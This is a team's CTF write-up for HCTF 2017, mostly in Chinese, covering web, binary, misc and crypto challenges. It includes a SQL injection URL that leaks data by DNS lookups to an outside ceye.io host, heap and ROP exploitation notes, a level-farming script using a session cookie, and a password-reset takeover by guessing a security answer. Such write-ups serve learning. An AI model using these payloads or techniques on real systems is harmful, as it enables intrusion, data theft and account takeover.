# HCTF 2017

team: `******`

```
Web

Level - 1
easy_sign_in [已完成]
Level - 2
babycrack [已完成]
boring website [已完成]
poker2 [已完成]
Level - 3
SQL Silencer [已完成]


Bin

Level - 1
Evr_Q [已完成]
Level - 2
ez_crackme [已完成]
guestbook [已完成]
babyprintf [已完成]
Level - 3
babystack [已完成]
Level - 4
babyre [已完成]

Extra

Level - 1
big_zip [已完成]
Level - 2
pokemon [已完成]
Level - 3
BabyRSA [已完成]

```

## guestbook

### 分析

保护全开，但漏洞很明显，为`snprintf`漏洞，限制了长度为256，不过次数很多，有10次。

### 构思

没有return的逻辑，于是目标锁定为改`malloc_hook`，先做泄漏，可以泄露出栈、libc和程序。

分四次修改malloc_hook，改为`one_gadget`。

然后发现`one_gadget`对栈上参数有等于NULL的要求，不过那个参数就是`index`，通过改写全局变量中的`inuse`，即可控为0。

### 利用

https://gist.github.com/elnx/98a9c62f59e0e610e41c526b0dd1ce42

## boring website


扫描得到代码，发现是link server。

于是利用mysql+win的特殊方法查数据，参考<https://ricterz.me/posts/%E7%AC%94%E8%AE%B0%3A%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks>

```
http://106.15.53.124:38324/?id=1%20union%20SELECT%201%20FROM%20openquery(mysql,%20%27select%20load_file(concat(%22\\\\%22,%20hex((select%201%20from%20information_schema.tables)),%20%22.gnlb5n.ceye.io\\bb%22))%27)
```

最终结果
```
646E352D316F672D63616E2D74616B652D663134672D366173383466.gnlb5n.ceye.io
```

## misc zip
爆破crc32
```python
import zipfile
import binascii
import itertools
import string

f = zipfile.ZipFile('./misc_big_zip.orig.zip')
infos = f.infolist()
crc_list = [item.CRC for item in infos]
name_list = [item.filename for item in infos]

pt = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm_'

for i in itertools.product(pt, pt, pt, pt, pt):
    m = ''.join(i)
    calc = binascii.crc32(m) & 0xffffffff
    if calc in crc_list:
        print m, name_list[crc_list.index(calc)]
```

注意有重复的crc。

结果为歌词`You_know_the_bed_feels_warmer_Sleeping_here_alone_You_know_I_dream_in_color_And_do_the_things_I_want_You_think_you_got_the_best_of_me_Think_you_had_the_last_laugh_Bet_you_think_that_everything_good_is_gone`，然后pkcrack爆破，拿到三个key用zipdecrypt解密，得到flag `hctf{We1c0me_2_HCTF2017_h4ve_fun_LOL}`

这里的坑点是需要用`7zip`压缩，其他压缩软件会让pkcrack出问题。


## sqls
观察、猜测大致逻辑。

- 正则匹配`/^[0-9]+`出来
    - 匹配成功
        - 判断是否在1-3之间，如果在进入查询，这里有过滤
            - 可能返回结果
            - 可能id error
            - 可能返回nothing
        - 不在，返回`only 3`
    - 匹配失败
        - `only 3`

于是想办法绕过过滤做注入，然后typecho漏洞。

所有脚本：

<https://gist.github.com/9de675d89a637f4968c2931d9a3776bc>

## babyprintf

首先从binary的样子来看很像去年的house of orange，尝试写了一下发现新的libc-2.24多了个检查导致无法直接用。
然后去翻了下angelboy最新放的slides，发现后续利用跟今年HITCON的题目类似。(<https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap>)
于是照着修改了下就出来了。


完整exp见<https://gist.github.com/Septyem/d38a2a9e0cda1a7f3b4437414c2d1f5c>

## babystack

### 分析

没canary没pie，一次任意泄漏，然后就是stack smash，造open read读文件即可，不过有地址范围判断。
```asm
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007
 0005: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0007
 0006: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 ```

 因为绝大多数的syscall都被过滤，类似于今年defcon qual里mute的思路，可以读取到flag后通过侧信道（死循环/退出）来泄漏出相关信息，但是这里必须使用ROP来完成。
 由于能够泄露libc地址，可用的gadget非常丰富，分支语句处可以找个临近ret的jnz或jz语句，然后控制寄存器的值使得不ret的那个分支尽快crash掉。死循环则是找了个jmp rbx的指令并使rbx等于该地址。
 
 完整exp见<https://gist.github.com/Septyem/bafc1244cf0d107a9bd030285fa73cb8>
 
 ## babyre
 
 该题的binary接受任意用户输入，并输出为一堆32位整数。
 逆向后首先可以看到里面有一些链表结构，根据对链表中元素进行运算的方式很容易想到是高精度计算。
 然后把相关的加减乘等函数看出来，就能发现快速幂的特征，知道是个有限域下的乘方操作。程序所做的就是将用户输入转化为数字后，使用内嵌的参数进行RSA加密后输出。
 提取出相关的n和e之后，由于e比较大，容易想到wiener's attack，不过由于手头直接有boneh_durfee的脚本就拿来跑了，同样能出结果。（<https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage>）
 获得d之后，用标准的RSA解密获得明文如下。
 `hctf{rsa_is_good_buf_e_must_be_small_e39c2d}`
 
 ## Evr_Q
 
 简单的逆向题，不过加了一点反调试
 用户名那段直接看出是`M.KATSURAGI`，然后密码那里分成好几段用不同的函数处理过后再比较，可以逐位爆破出来，代码片段如下
 ```python
 def trysth1(ct):
	tmp=''
	for i in range(7):
		for j in range(256):
			res=2 * j & 0xaa | ((j & 0xaa) >> 1)
			if res==ord(ct[i]):
				tmp+=chr(j)
				break
	return doxor(tmp,0xad)

>>> doxor(trysth1(ct1),0x76)
'D55_CH0'
>>> doxor(trysth2(ct2),0x76)
'CK3R_B0'
>>> doxor(trysth3(ct3),0x76)
'o0M!-57'
>>> 
 ```
 
 最后跟首尾处拼起来就得到flag
 `hctf{>>D55_CH0CK3R_B0o0M!-57e8ea8a}`
 
 ## misc pokemon
 搜索到一片pokemon相关nds的修改博客<http://veritas501.space/2017/02/25/[%E6%90%AC%E8%BF%90]%20%E4%BF%AE%E6%94%B9%20%E7%BB%9D%E5%AF%B9%E9%AD%82%E9%93%B6The%20ONE%20%E4%B9%8B%20%E8%A7%A3%E6%94%BE%E4%BA%8C%E5%91%A8%E7%9B%AE/#more>
 
 根据博客流程，用`ppre`打开rom，根据提示，flag在第一个道馆处，根据rom信息，游戏是口袋妖怪心金，所以第一个道馆是`桔梗市（Violet City)`，在maps中找到对应城市道馆，在对话文本中看到了几十个可能的flag，其中给出了提示在script中可以找到正确的flag，查看script，在function中看到了`Message 64 `,即对话64，恰好是可能的flag之一，所以
 将`text_64="hctf(6A0A81AB5F9917B1EEC3A6183C614380)"`，的`()`替换成`{}`，即可得到flag=`hctf{6A0A81AB5F9917B1EEC3A6183C614380}`
 
 ## poker2
 ### 方法1
 写脚本暴力刷级
```python
import requests

cookies={}
cookies['PHPSESSID']='gdkkh4lrls84gfat223rbvc9r5'

url1 = "http://petgame.2017.hctf.io/function/Fight_Mod.php"
querystring1 = {"p":"51896","bid":"5658","rd":"0.2812745127643508"}
url2 = "http://petgame.2017.hctf.io/function/FightGate.php"
querystring2 = {"id":"1","g":"843","checkwg":"checked","rd":"0.21345818199297484"}

while True:
    requests.request("GET", url1, params=querystring1,cookies=cookies)
    requests.request("GET", url2, params=querystring2,cookies=cookies)
    requests.request("GET", url2, params=querystring2,cookies=cookies)
    requests.request("GET", url2, params=querystring2,cookies=cookies)

```

### 方法2
发现密码保护页面可以重置密码，找到宠物排名等级大于100的用户，猜测其密保答案，成功猜测得到`aaad`的密保答案`aaad`，修改密码，登录拿到flag

## babycrack
一道js逆向题，发现程序会定时启动debugger，先把相关代码删去方便调试
分析代码逻辑，发现会把输入用"_"分割
然后对每个部分 分别做判断，可以很快得到中间三个串分别是 rev3rse iz s0，根据提示结合逆向出的方程得到最后一个串为h4rd23ee3333}，但是第一个串会有多解，根据给出的sha256可以验证出第一个串为hctf{j5
最终flag为hctf{j5_rev3rse_iz_s0_h4rd23ee3333}

## ez_crackme
程序相当于自定义了一个指令集，会执行内置的一串bytecode，通过switch判断不同的opcode进入不同的函数进行具体操作。
先写一个脚本打印出bytecode对应的指令流，获得了类似于汇编的程序，然后逆向其逻辑整理为

```python
result=[0xF7,0xC,0x3B,0x81,8,0x49,0x86,13,79,29,0x8B,32,0x80,0x89,0xC5,69,0xDC,12,43,19,0x79,0x60,0x2D,0x9F,101,0x7D,0xC2,0xD9,0x4B,0x40,0x27,0x4C]
result= "".join([chr (x) for x in result])

b=[]
i=0
a=0

def su(p,q):
  v8=q%32
  v2=32-v8
  v3=1<<v2
  if(v2&0x20):
    v3=0
  v4=(p>>q%32)&(v3-1)
  v5=1<<v8
  if(v8&0x20):
    v5=0
  v6=((v5-1)&p)<<(32-v8)
  if((32-v8&0xff)&0x20):
    v6=0
  return (v4+v6)&0xffffffff    
  
while(i<32):
  a=(a+51)%32
  b.append(flag[a])
  i+=1
b= "".join(b)
c=""
for i in range(31):
  p=ord(b[i])&31
  p=(p<<3)&0xff
  q=ord(b[i+1]) &224 
  q=(q>>5)&0xff
  c+=chr(p+q)
p=ord(b[-1])&31
p=(p<<3)&0xff
q=ord(b[0]) &224 
q=(q>>5)&0xff
c+=chr(p+q)  
print c.encode("hex")  
tt=0XEFBEADDE
d=""
for i in range(32):
  d+=chr(((i+(tt&0xff))&0xff)^ord(c[i]))
  tt=su(tt,8)
  print hex(tt)
print d.encode("hex")  
if(d==result):
  print "success"
```

还原flag的脚本为
```python
result="f70c3b810849860d4f1d8b208089c545dc0c2b1379602d9f657dc2d94b40274c".decode("hex")
tt=0XEFBEADDE
c=""
def su(p,q):
  v8=q%32
  v2=32-v8
  v3=1<<v2
  if(v2&0x20):
    v3=0
  v4=(p>>q%32)&(v3-1)
  v5=1<<v8
  if(v8&0x20):
    v5=0
  v6=((v5-1)&p)<<(32-v8)
  if((32-v8&0xff)&0x20):
    v6=0
  return (v4+v6)&0xffffffff
  
for i in range(32):
  c+=chr(((i+(tt&0xff))&0xff)^ord(result[i]))
  tt=su(tt,8)
print c.encode("hex") 
b="" 
for i in range(32):
  p=(ord(c[i])>>3)&0xff
  q=(ord(c[i-1])<<5)&0xff
  b+=chr(p+q)
print b
a=0
aa=[0]*32
i=0
while(i<32):
  a=(a+51)%32
  
  aa[a]=b[i]
  i+=1
aa="".join(aa)
print aa
```




## babyRSA
通过交互可以得到 C=pow(2*flag,d,N)以及N
由于e<65537 可以爆破所有的e
s=pow(C,e,N)*inverse(2,N)
以“hctf”开头的s就是flag

```python
>>> for i in range(3,65537,2):
...     pt=pow(sig,i,n)
...     pt=pt*inverse(2,n)%n
...     if hex(pt)[2:10].decode('hex').startswith('hctf'):
...             print i,pt
...
655 1538899442394545103371355371081003876231611076643068150684119351057336483802830877629852178342089963696656099851234687269865315874736446375122759847626727914191214687869
```

